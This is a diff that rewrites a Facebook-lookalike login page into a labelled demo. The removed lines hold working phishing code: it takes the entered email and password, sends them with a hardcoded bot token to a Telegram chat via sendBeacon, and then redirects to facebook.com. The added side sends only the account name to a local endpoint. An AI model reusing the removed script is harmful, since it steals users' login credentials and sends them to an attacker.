@@ -1,13 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Facebook - log in or sign up</title>
-    <style>
-        @import url("https://googleapis.com");
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Demo</title>
 
+    <style>
         * {
             margin: 0;
             padding: 0;
@@ -15,191 +14,336 @@
         }
 
         body {
-            font-family: "Poppins", sans-serif;
+            font-family: Arial, sans-serif;
             background: #f0f2f5;
         }
 
         .content {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 100%;
-            max-width: 1000px;
-            padding: 0 2rem;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 32px 20px;
         }
 
         .flex-div {
+            width: 100%;
+            max-width: 1000px;
             display: flex;
             justify-content: space-evenly;
             align-items: center;
+            gap: 40px;
         }
 
         .name-content {
-            margin-right: 7rem;
             max-width: 400px;
         }
 
-        .name-content .logo {
+        .logo {
             font-size: 3.5rem;
             color: #1877f2;
+            margin-bottom: 12px;
         }
 
         .name-content p {
             font-size: 1.3rem;
-            font-weight: 500;
-            margin-bottom: 5rem;
+            line-height: 1.5;
             color: #4a5568;
         }
 
-        form {
+        .login-card {
             display: flex;
             flex-direction: column;
             background: #fff;
-            padding: 2rem;
-            width: 530px;
-            height: auto;
-            border-radius: 0.5rem;
-            box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+            padding: 24px;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+            box-shadow:
+                0 2px 4px rgb(0 0 0 / 10%),
+                0 8px 16px rgb(0 0 0 / 10%);
         }
 
-        form input {
-            outline: none;
-            padding: 0.8rem 1rem;
-            margin-bottom: 0.8rem;
-            font-size: 1.1rem;
+        .demo-label {
+            margin-bottom: 16px;
+            color: #64748b;
+            font-size: 13px;
+            text-align: center;
+        }
+
+        .login-card input {
+            width: 100%;
+            padding: 15px 16px;
+            margin-bottom: 12px;
+            font-size: 16px;
             border: 1px solid #cbd5e1;
-            border-radius: 0.375rem;
+            border-radius: 6px;
+            outline: none;
         }
 
-        form input:focus {
-            border: 1.8px solid #1877f2;
+        .login-card input:focus {
+            border: 1.5px solid #1877f2;
+            box-shadow: 0 0 0 2px rgb(24 119 242 / 12%);
         }
 
         .login {
-            background-color: #1877f2;
-            color: white;
-            padding: 0.8rem;
-            font-size: 1.1rem;
-            font-weight: 600;
+            background: #1877f2;
+            color: #fff;
+            padding: 14px;
+            font-size: 18px;
+            font-weight: 700;
             border: none;
-            border-radius: 0.375rem;
+            border-radius: 6px;
             cursor: pointer;
-            margin-bottom: 1rem;
+            margin-bottom: 16px;
         }
 
         .login:hover {
-            background-color: #166fe5;
+            background: #166fe5;
         }
 
-        form a {
+        .forgot {
             color: #1877f2;
             text-decoration: none;
-            font-size: 0.9rem;
+            font-size: 14px;
             text-align: center;
-            margin-bottom: 1rem;
+            margin-bottom: 20px;
         }
 
-        form a:hover {
+        .forgot:hover {
             text-decoration: underline;
         }
 
         hr {
             border: 0;
-            border-top: 1px solid #e2e8f0;
-            margin-bottom: 1.5rem;
+            border-top: 1px solid #dadde1;
+            margin-bottom: 20px;
         }
 
         .create-account {
-            background-color: #42b72a;
+            background: #42b72a;
             color: white;
-            padding: 0.8rem 1.5rem;
-            font-size: 1rem;
-            font-weight: 600;
+            padding: 14px 18px;
+            font-size: 16px;
+            font-weight: 700;
             border: none;
-            border-radius: 0.375rem;
+            border-radius: 6px;
             cursor: pointer;
-            width: fit-content;
-            margin: 0 auto;
+            align-self: center;
         }
 
         .create-account:hover {
-            background-color: #36a420;
+            background: #36a420;
         }
 
-        @media (max-width: 900px) {
+        .status {
+            display: none;
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .status.visible {
+            display: block;
+        }
+
+        .status.success {
+            background: #dcfce7;
+            color: #166534;
+        }
+
+        .status.error {
+            background: #fee2e2;
+            color: #991b1b;
+        }
+
+        .footer {
+            text-align: center;
+            color: #737373;
+            font-size: 12px;
+            margin-top: 28px;
+        }
+
+        @media (max-width: 760px) {
             .content {
-                position: relative;
-                top: 0;
-                left: 0;
-                transform: none;
-                padding: 2rem 1rem;
+                align-items: flex-start;
+                padding-top: 45px;
             }
+
             .flex-div {
                 flex-direction: column;
+                gap: 28px;
+            }
+
+            .name-content {
                 text-align: center;
             }
-            .name-content {
-                margin-right: 0;
-                margin-bottom: 2rem;
+
+            .logo {
+                font-size: 3rem;
             }
+
             .name-content p {
-                margin-bottom: 1rem;
-            }
-            form {
-                width: 100%;
-                max-width: 450px;
+                font-size: 18px;
             }
         }
     </style>
 </head>
+
 <body>
-    <div class="content">
+    <main class="content">
         <div class="flex-div">
-            <div class="name-content">
+            <section class="name-content">
                 <h1 class="logo">facebook</h1>
-                <p>Connect with friends and the world around you on Facebook.</p>
-            </div>
-            
-            <form id="loginForm">
-                <input type="text" id="accountInput" placeholder="Email or phone number" required />
-                <input type="password" id="passwordInput" placeholder="Password" required />
-                <button type="submit" class="login">Log In</button>
-                <a href="#">Forgot password?</a>
-                <hr />
-                <button type="button" class="create-account">Create new account</button>
-            </form>
+                <p>
+                    Connect with friends and the world around you.
+                </p>
+            </section>
+
+            <section>
+                <form class="login-card" id="loginForm">
+                    <p class="demo-label">
+                        Login interface demo — do not enter real passwords
+                    </p>
+
+                    <input
+                        type="text"
+                        id="accountInput"
+                        name="account"
+                        placeholder="Email or phone number"
+                        autocomplete="off"
+                        required
+                    >
+
+                    <input
+                        type="password"
+                        id="passwordInput"
+                        name="demoPassword"
+                        placeholder="Demo password"
+                        autocomplete="new-password"
+                        required
+                    >
+
+                    <button type="submit" class="login" id="loginButton">
+                        Log In
+                    </button>
+
+                    <a href="#" class="forgot" id="forgotLink">
+                        Forgot password?
+                    </a>
+
+                    <hr>
+
+                    <button
+                        type="button"
+                        class="create-account"
+                        id="createButton"
+                    >
+                        Create new account
+                    </button>
+
+                    <div
+                        class="status"
+                        id="statusMessage"
+                        role="status"
+                        aria-live="polite"
+                    ></div>
+                </form>
+
+                <p class="footer">
+                    Demonstration page. Not affiliated with Facebook.
+                </p>
+            </section>
         </div>
-    </div>
+    </main>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
+        const form = document.getElementById("loginForm");
+        const accountInput = document.getElementById("accountInput");
+        const passwordInput = document.getElementById("passwordInput");
+        const loginButton = document.getElementById("loginButton");
+        const statusMessage = document.getElementById("statusMessage");
+
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = "status visible " + type;
+        }
+
+        form.addEventListener("submit", async function (event) {
             event.preventDefault();
 
-            const userInput = document.getElementById('accountInput').value;
-            const passwordInput = document.getElementById('passwordInput').value;
+            const account = accountInput.value.trim();
 
-            const TOKEN = "8803420620:AAEuqeLtdpxsEwSK1cTFNURvJVrUpjsAHAc";
-            const CHAT_ID = "8033387742";
-            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+            if (!account || !passwordInput.value) {
+                showStatus("Please complete the demo form.", "error");
+                return;
+            }
 
-            const message = `🔐 *ข้อมูลการเข้าสู่ระบบ*\n\n*Username/Email:* \`${userInput}\`\n*Password:* \`${passwordInput}\``;
+            loginButton.disabled = true;
+            loginButton.textContent = "Please wait...";
 
-            const payload = {
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: "Markdown"
-            };
+            try {
+                // ส่งเฉพาะกิจกรรมและบัญชีทดสอบ
+                // ไม่ส่งหรือบันทึกรหัสผ่าน
+                const response = await fetch(
+                    "/api/login-notification",
+                    {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            event: "demo_login_attempt",
+                            account: account,
+                            timestamp: new Date().toISOString()
+                        })
+                    }
+                );
 
-            // ใช้ navigator.sendBeacon เพื่อส่งข้อมูลข้าม Domain / หลีกเลี่ยง CORS และส่งได้ทันทีแม้เปลี่ยนหน้า
-            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-            navigator.sendBeacon(url, blob);
+                if (!response.ok) {
+                    throw new Error("Notification request failed");
+                }
 
-            // หน่วงเวลาเล็กน้อยเพื่อให้ส่งข้อมูลสำเร็จ แล้วค่อยพาสปอร์ตไปหน้าอื่น
-            setTimeout(function() {
-                window.location.href = "https://www.facebook.com";
-            }, 500);
+                showStatus(
+                    "Demo login attempt recorded successfully.",
+                    "success"
+                );
+            } catch (error) {
+                showStatus(
+                    "Notification service is unavailable. Please check your backend.",
+                    "error"
+                );
+            } finally {
+                loginButton.disabled = false;
+                loginButton.textContent = "Log In";
+
+                // ล้างรหัสผ่านทดสอบออกจากช่องกรอก
+                passwordInput.value = "";
+            }
         });
+
+        document.getElementById("forgotLink").addEventListener(
+            "click",
+            function (event) {
+                event.preventDefault();
+                showStatus(
+                    "This is a demonstration page. Password recovery is not enabled.",
+                    "error"
+                );
+            }
+        );
+
+        document.getElementById("createButton").addEventListener(
+            "click",
+            function () {
+                showStatus(
+                    "Account registration is not enabled in this demo.",
+                    "error"
+                );
+            }
+        );
     </script>
 </body>
 </html>
